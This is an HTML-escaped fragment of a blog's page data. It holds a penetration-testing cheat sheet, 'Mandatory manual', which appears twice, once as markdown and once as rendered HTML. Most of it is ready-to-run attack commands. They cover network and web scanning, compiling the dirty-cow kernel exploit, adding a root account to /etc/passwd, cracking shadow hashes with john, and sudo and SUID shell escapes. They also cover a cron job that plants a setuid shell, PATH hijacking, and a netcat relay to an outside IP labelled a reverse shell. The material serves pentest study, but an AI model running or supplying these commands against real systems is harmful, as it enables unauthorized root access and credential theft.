icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;h3 id=\&quot;kernel-stack-overflow\&quot;&gt;Kernel stack overflow&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#kernel-stack-overflow\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;uname -a&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;cat /etc/*-release&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;searchsploit linux 3.10 CentOS Linux 7&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;use tools&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;./linux-exploit-suggester-2.pl&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;Take the rights of dirty-cow as an example&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;gcc -pthread dirty.c -lcrypt -o dirty&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;chmod +x dirty&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;./dirty fly&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;h3 id=\&quot;plain-password-of-root\&quot;&gt;Plain password of root&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#plain-password-of-root\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;p&gt;If /etc/passwd can be write by common user.&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;openssl passwd -1 -salt hacker 123456&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;generate &lt;code&gt;$1$hacker$4o50Z4aoUGaLMC0Rg4Io40&lt;/code&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;echo &#39;hacker:$1$hacker$4o50Z4aoUGaLMC0Rg4Io40:0:0:/root:/bin/bash&#39; &gt;&gt; /etc/passwd&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;Then login in user hacker&lt;/p&gt;\n&lt;p&gt;If /etc/shadow can be read by common user.&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;unshadow /etc/passwd /etc/shadow &gt; shadow.txt&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;chmod 777 shadow.txt&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;john --format=crypt --wordlist=/usr/share/john/password.lst shadow.txt&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;h3 id=\&quot;password-reuse\&quot;&gt;Password reuse&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#password-reuse\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;h3 id=\&quot;sudo-abuse\&quot;&gt;Sudo abuse&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#sudo-abuse\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;p&gt;&lt;code&gt;sudo -l&lt;/code&gt;&lt;/p&gt;\n&lt;blockquote&gt;\n&lt;div class=\&quot;link-preview-block not-prose\&quot; data-state=\&quot;success\&quot;&gt;\n  &lt;a href=\&quot;https://gtfobins.github.io/\&quot; target=\&quot;_blank\&quot; class=\&quot;group block overflow-hidden rounded-lg border border-border transition-all hover:border-primary/50 hover:shadow-md\&quot; aria-label=\&quot;GTFOBins - gtfobins.github.io\&quot;&gt;\n    &lt;div class=\&quot;bg-card flex md:flex-col flex-row\&quot;&gt;\n      &lt;div class=\&quot;flex-1 p-4\&quot;&gt;\n        &lt;div class=\&quot;mb-2 flex items-center gap-2\&quot;&gt;\n          &lt;img src=\&quot;https://gtfobins.github.io/assets/logo.png\&quot; alt=\&quot;\&quot; class=\&quot;h-4 w-4 shrink-0\&quot; loading=\&quot;lazy\&quot; aria-hidden=\&quot;true\&quot;&gt;\n          &lt;span class=\&quot;text-muted-foreground truncate text-xs font-medium\&quot;&gt;gtfobins.github.io&lt;/span&gt;\n        &lt;/div&gt;\n        &lt;h3 class=\&quot;text-foreground mb-2 line-clamp-2 font-semibold leading-tight\&quot;&gt;GTFOBins&lt;/h3&gt;\n        &lt;p class=\&quot;text-muted-foreground mb-3 line-clamp-2 text-sm\&quot;&gt;GTFOBins is a curated list of Unix-like executables that can be used to bypass local security restrictions in misconfigured systems.&lt;/p&gt;\n        &lt;div class=\&quot;text-primary flex items-center gap-1 text-xs\&quot;&gt;\n          &lt;span class=\&quot;truncate\&quot;&gt;https://gtfobins.github.io/&lt;/span&gt;\n          &lt;svg class=\&quot;h-3 w-3 shrink-0 transition-transform group-hover:translate-x-0.5\&quot; aria-hidden=\&quot;true\&quot; viewBox=\&quot;0 0 12 12\&quot;&gt;&lt;path fill=\&quot;currentColor\&quot; d=\&quot;M4 3.5a.5.5 0 0 0-.5.5v4a.5.5 0 0 0 .5.5h4a.5.5 0 0 0 .5-.5v-.25a.75.75 0 0 1 1.5 0V8a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h.25a.75.75 0 0 1 0 1.5zm2.75 0a.75.75 0 0 1 0-1.5h2.5a.75.75 0 0 1 .75.75v2.5a.75.75 0 0 1-1.5 0v-.69L7.28 5.78a.75.75 0 0 1-1.06-1.06L7.44 3.5z\&quot;&gt;&lt;/path&gt;&lt;/svg&gt; \n        &lt;/div&gt;\n      &lt;/div&gt;\n      &lt;div class=\&quot;bg-muted relative md:w-full shrink-0 aspect-1200/630 h-38\&quot;&gt;&lt;img src=\&quot;https://gtfobins.github.io/assets/logo.png\&quot; alt=\&quot;GTFOBins\&quot; class=\&quot;h-full w-full object-cover\&quot; loading=\&quot;lazy\&quot;&gt;&lt;/div&gt;\n    &lt;/div&gt;\n  &lt;/a&gt;\n&lt;/div&gt;\n&lt;/blockquote&gt;\n&lt;p&gt;For example:&lt;code&gt;su,    awk,    man &lt;/code&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;sudo su&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;sudo awk &#39;BEGIN {system(\&quot;/bin/sh\&quot;)}&#39;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;sudo man man&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;!/bin/sh&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;sudo vim -c &#39;:!/bin/sh&#39;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;h3 id=\&quot;su-root-prohibited\&quot;&gt;’su root’ prohibited&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#su-root-prohibited\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;python -c &#39;import pty;pty.spawn(\&quot;/bin/sh\&quot;)&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;sudo su&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;h3 id=\&quot;scheduled-task\&quot;&gt;Scheduled task&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#scheduled-task\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;ls -l /etc/cron*&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;cat /etc/crontab&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;If there is a scheduled task named 1.py&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;ls -al /tmp/1.py    //查看是否有w权限&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;Write the code into 1.py&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;import os &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;os.system(&#39;cp /bin/sh /tmp/sh&#39;) &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;os.system(&#39;chmod u+s /tmp/sh&#39;)&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;code&gt;./tmp/sh&lt;/code&gt;&lt;/p&gt;\n&lt;h3 id=\&quot;suid\&quot;&gt;SUID&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#suid\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;p&gt;Take nmap as an example:&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;find / -user root -perm -4000 -print 2&gt;/dev/null find / -perm -u=s -type f 2&gt;/dev/null&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;/usr/local/bin/nmap --interactive&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;!sh&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;whoami&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;h3 id=\&quot;environment-variable-hijacking\&quot;&gt;Environment variable hijacking&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#environment-variable-hijacking\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;p&gt;Find command with suid just as 4.1.7.\nSuppose it is &lt;code&gt;su&lt;/code&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;vim /tmp/su         //write shellcode into su&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;export PATH=/tmp:$PATH&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;h3 id=\&quot;administrator-configuration-error\&quot;&gt;Administrator configuration error&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#administrator-configuration-error\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;p&gt;Configuring a program with SUID that does not have the setuid(0) code, such as &lt;code&gt;find &lt;/code&gt;mentioned above.&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;mkdir abc&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;find abc -exec &#39;/bin/sh&#39; \\;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;h3 id=\&quot;docker-group\&quot;&gt;Docker group&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#docker-group\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;h3 id=\&quot;service-vulnerability\&quot;&gt;Service vulnerability&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#service-vulnerability\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;netstat -antup&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;Redis reverse shell.&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;nc -l 12345 | nc 102.168.191.170 80&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;h2 id=\&quot;windows\&quot;&gt;Windows&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#windows\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;hr&gt;\n&lt;h1 id=\&quot;5-domain-penetration\&quot;&gt;5 Domain penetration&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#5-domain-penetration\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;&quot;],&quot;metadata&quot;:[0,{&quot;headings&quot;:[1,[[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;information-gathering&quot;],&quot;text&quot;:[0,&quot;Information gathering&quot;]}],[0,{&quot;depth&quot;:[0,2],&quot;slug&quot;:[0,&quot;port-scan&quot;],&quot;text&quot;:[0,&quot;Port scan&quot;]}],[0,{&quot;depth&quot;:[0,2],&quot;slug&quot;:[0,&quot;web-scan&quot;],&quot;text&quot;:[0,&quot;Web scan&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;vulnerability-analysis&quot;],&quot;text&quot;:[0,&quot;Vulnerability analysis&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;exploitation&quot;],&quot;text&quot;:[0,&quot;Exploitation&quot;]}],[0,{&quot;depth&quot;:[0,2],&quot;slug&quot;:[0,&quot;smb&quot;],&quot;text&quot;:[0,&quot;smb&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;privilege-escalation&quot;],&quot;text&quot;:[0,&quot;Privilege escalation&quot;]}],[0,{&quot;depth&quot;:[0,2],&quot;slug&quot;:[0,&quot;linux&quot;],&quot;text&quot;:[0,&quot;Linux&quot;]}],[0,{&quot;depth&quot;:[0,3],&quot;slug&quot;:[0,&quot;kernel-stack-overflow&quot;],&quot;text&quot;:[0,&quot;Kernel stack overflow&quot;]}],[0,{&quot;depth&quot;:[0,3],&quot;slug&quot;:[0,&quot;plain-password-of-root&quot;],&quot;text&quot;:[0,&quot;Plain password of root&quot;]}],[0,{&quot;depth&quot;:[0,3],&quot;slug&quot;:[0,&quot;password-reuse&quot;],&quot;text&quot;:[0,&quot;Password reuse&quot;]}],[0,{&quot;depth&quot;:[0,3],&quot;slug&quot;:[0,&quot;sudo-abuse&quot;],&quot;text&quot;:[0,&quot;Sudo abuse&quot;]}],[0,{&quot;depth&quot;:[0,3],&quot;slug&quot;:[0,&quot;su-root-prohibited&quot;],&quot;text&quot;:[0,&quot;’su root’ prohibited&quot;]}],[0,{&quot;depth&quot;:[0,3],&quot;slug&quot;:[0,&quot;scheduled-task&quot;],&quot;text&quot;:[0,&quot;Scheduled task&quot;]}],[0,{&quot;depth&quot;:[0,3],&quot;slug&quot;:[0,&quot;suid&quot;],&quot;text&quot;:[0,&quot;SUID&quot;]}],[0,{&quot;depth&quot;:[0,3],&quot;slug&quot;:[0,&quot;environment-variable-hijacking&quot;],&quot;text&quot;:[0,&quot;Environment variable hijacking&quot;]}],[0,{&quot;depth&quot;:[0,3],&quot;slug&quot;:[0,&quot;administrator-configuration-error&quot;],&quot;text&quot;:[0,&quot;Administrator configuration error&quot;]}],[0,{&quot;depth&quot;:[0,3],&quot;slug&quot;:[0,&quot;docker-group&quot;],&quot;text&quot;:[0,&quot;Docker group&quot;]}],[0,{&quot;depth&quot;:[0,3],&quot;slug&quot;:[0,&quot;service-vulnerability&quot;],&quot;text&quot;:[0,&quot;Service vulnerability&quot;]}],[0,{&quot;depth&quot;:[0,2],&quot;slug&quot;:[0,&quot;windows&quot;],&quot;text&quot;:[0,&quot;Windows&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;5-domain-penetration&quot;],&quot;text&quot;:[0,&quot;5 Domain penetration&quot;]}]]],&quot;localImagePaths&quot;:[1,[]],&quot;remoteImagePaths&quot;:[1,[]],&quot;frontmatter&quot;:[0,{&quot;title&quot;:[0,&quot;Mandatory manual&quot;],&quot;date&quot;:[3,&quot;2026-02-03T10:36:58.000Z&quot;],&quot;tags&quot;:[1,[[0,&quot;渗透&quot;]]],&quot;categories&quot;:[0,&quot;Penetration&quot;]}],&quot;imagePaths&quot;:[1,[]]}]}],&quot;collection&quot;:[0,&quot;blog&quot;]}],&quot;href&quot;:[0,&quot;/blog/post/10&quot;]}]]],&quot;currentPostSlug&quot;:[0,&quot;penetration/common-process-for-handling-objectives&quot;],&quot;prevPostItem&quot;:[0,null],&quot;nextPostItem&quot;:[0,{&quot;post&quot;:[0,{&quot;id&quot;:[0,&quot;penetration/mandatory-manual&quot;],&quot;data&quot;:[0,{&quot;title&quot;:[0,&quot;Mandatory manual&quot;],&quot;date&quot;:[3,&quot;2026-02-03T10:36:58.000Z&quot;],&quot;tags&quot;:[1,[[0,&quot;渗透&quot;]]],&quot;categories&quot;:[0,&quot;Penetration&quot;]}],&quot;body&quot;:[0,&quot;# Information gathering\n## Port scan\n```\nnetdiscover -r 192.168.124.0/24\nnmap -Pn -sV -O  -T4  --script vuln 192.168.124.44 -p-\n```\n\n\n## Web scan\n```\ndirb http://192.168.124.44:80/ /usr/share/wordlists/dirb/big.txt\nnikto  -port 80 -host 192.168.124.44 -o nikto-result.txt\n```\n***\n# Vulnerability analysis\nUse nc to view banner.\n```\nnc -nv 192.168.124.44 22\n```\n```\nsearchsploit &lt;service name&gt;\nsearchsploit -m 47080\n```\n\n\n***\n# Exploitation\n\n## smb\n```\nenum4linux 192.168.124.40\nsmbclient -L 192.168.124.40\n```\n\n\n***\n# Privilege escalation\n## Linux \n### Kernel stack overflow\n```\nuname -a\ncat /etc/*-release\nsearchsploit linux 3.10 CentOS Linux 7\n```\nuse tools\n```\n./linux-exploit-suggester-2.pl\n```\nTake the rights of dirty-cow as an example\n```\ngcc -pthread dirty.c -lcrypt -o dirty\nchmod +x dirty\n./dirty fly\n```\n### Plain password of root\nIf /etc/passwd can be write by common user.\n```\nopenssl passwd -1 -salt hacker 123456\n```\ngenerate `$1$hacker$4o50Z4aoUGaLMC0Rg4Io40`\n```\necho &#39;hacker:$1$hacker$4o50Z4aoUGaLMC0Rg4Io40:0:0:/root:/bin/bash&#39; &gt;&gt; /etc/passwd\n```\nThen login in user hacker\n\nIf /etc/shadow can be read by common user.\n```\nunshadow /etc/passwd /etc/shadow &gt; shadow.txt\nchmod 777 shadow.txt\njohn --format=crypt --wordlist=/usr/share/john/password.lst shadow.txt\n```\n### Password reuse\n### Sudo abuse\n`sudo -l`\n&gt;https://gtfobins.github.io/\n\nFor example:`su,    awk,    man `\n```\nsudo su\n```\n```\nsudo awk &#39;BEGIN {system(\&quot;/bin/sh\&quot;)}&#39;\n```\n```\nsudo man man\n!/bin/sh\n```\n```\nsudo vim -c &#39;:!/bin/sh&#39;\n```\n### &#39;su root&#39; prohibited\n```\npython -c &#39;import pty;pty.spawn(\&quot;/bin/sh\&quot;)\nsudo su\n```\n### Scheduled task\n```\nls -l /etc/cron*\ncat /etc/crontab\n```\nIf there is a scheduled task named 1.py\n```\nls -al /tmp/1.py    //查看是否有w权限\n```\nWrite the code into 1.py\n```\nimport os \nos.system(&#39;cp /bin/sh /tmp/sh&#39;) \nos.system(&#39;chmod u+s /tmp/sh&#39;)\n```\n`./tmp/sh`\n### SUID\nTake nmap as an example:\n```\nfind / -user root -perm -4000 -print 2&gt;/dev/null find / -perm -u=s -type f 2&gt;/dev/null\n/usr/local/bin/nmap --interactive\n!sh\nwhoami\n```\n### Environment variable hijacking\nFind command with suid just as 4.1.7.\nSuppose it is `su`\n```\nvim /tmp/su         //write shellcode into su\nexport PATH=/tmp:$PATH\n```\n### Administrator configuration error\nConfiguring a program with SUID that does not have the setuid(0) code, such as `find `mentioned above.\n```\nmkdir abc\nfind abc -exec &#39;/bin/sh&#39; \\;\n```\n### Docker group\n### Service vulnerability\n```\nnetstat -antup\n```\nRedis reverse shell.\n```\nnc -l 12345 | nc 102.168.191.170 80\n```\n## Windows\n***\n# 5 Domain penetration&quot;],&quot;filePath&quot;:[0,&quot;source/posts/Penetration/Mandatory manual.md&quot;],&quot;digest&quot;:[0,&quot;9a10681b2f297e3d&quot;],&quot;rendered&quot;:[0,{&quot;html&quot;:[0,&quot;&lt;h1 id=\&quot;information-gathering\&quot;&gt;Information gathering&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#information-gathering\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;h2 id=\&quot;port-scan\&quot;&gt;Port scan&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#port-scan\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;netdiscover -r 192.168.124.0/24&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;nmap -Pn -sV -O  -T4  --script vuln 192.168.124.44 -p-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;h2 id=\&quot;web-scan\&quot;&gt;Web scan&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#web-scan\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;dirb http://192.168.124.44:80/ /usr/share/wordlists/dirb/big.txt&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;nikto  -port 80 -host 192.168.124.44 -o nikto-result.txt&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;hr&gt;\n&lt;h1 id=\&quot;vulnerability-analysis\&quot;&gt;Vulnerability analysis&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#vulnerability-analysis\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;p&gt;Use nc to view banner.&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; 